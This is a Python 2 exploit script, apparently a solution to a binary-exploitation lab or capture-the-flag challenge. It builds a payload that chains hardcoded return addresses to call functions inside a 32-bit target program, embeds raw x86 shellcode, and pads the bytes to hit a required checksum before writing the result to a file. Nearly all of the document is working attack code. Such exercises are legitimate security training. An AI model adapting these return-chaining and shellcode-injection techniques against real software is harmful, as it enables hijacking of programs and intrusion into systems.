import struct

# Convert integer to byte array (integer little endian).
def dw(i):
    return struct.pack("<I",i)

def one_funct(target1, target2, params):
    return  '3\n' + "1337" + dw(0xffffcd64) + dw(target1) + dw(target2) + params # 0xffffcd64 8

offset = 4

test=0x80489a7

unblock1=0x8048895
unblock2=0x80488ba
unblock3=0x80488ea
send_magic=0x804874e
exit=0xf7e259d0
ebp_in_enter_key=0x8048a18
main=0x804893a#0x8048a09
leave=0x8048985
read_key=0x8048736

final_sum = 0x12345

win=0x804882b

#shellcode_address=0x804a428
#shellcode_address=3221222456
#shellcode_address=0xbffff824
shellcode_address=0x81e58955


payload = ''
payload += one_funct(unblock1, main, "") + '12345678'
payload += one_funct(unblock2, main, dw(0xdeadc0de)) + '1234'
payload += one_funct(unblock3, main, dw(0x78f26913) + dw(0x65bb55dc))
payload += one_funct(send_magic, main, "") + '12345678'

end = "" + dw(shellcode_address) + "00000" + 4* dw(0)

max_c=1000

shellcode =("\xA1\x28\xA4\x04"
            "\x08\x89\x45\xFC"
            "\xA3\xA0\xA2\x04"
            "\x08\x8B\x45\xFC"
            "\xC1\xE0\x10\x33"
            "\x45\xFC\x69\xC0"
            "\x3A\x9F\x5D\x04"
            "\xA3\xA0\xA2\x04"
            "\x08\xE8\x27\x88"
            "\x04\x08\x90\x90")
s = sum(bytearray(shellcode))
the_rest = "MihneaSerban321CA000"
s += sum(bytearray(the_rest))
s += sum(bytearray(end))
while final_sum - s >= 0xff*4:
    the_rest += dw(0xffffffff)
    s += 4*0xff
while final_sum - s >= 0xff:
    the_rest += dw(0xff)
    s += 0xff
the_rest += dw(final_sum - s)
c = len(the_rest)
c += len(shellcode)
while c <= max_c: #verifica
    the_rest += dw(0)
    c = c + 4

the_rest = shellcode + the_rest + end


s2 = sum(bytearray(the_rest))
if s2 != final_sum:
    print "SIRUL NU ARE DIMENSIUNEA BUNA, CI " + str(s2) + ", ADICA  cu " + str(final_sum - s2) + " mai mult"
the_rest_xored = the_rest
#for i in bytearray(the_rest):
#    the_rest_xored += chr(i^170)

payload += the_rest_xored

with open('payload', 'wb') as f:
    f.write(payload)
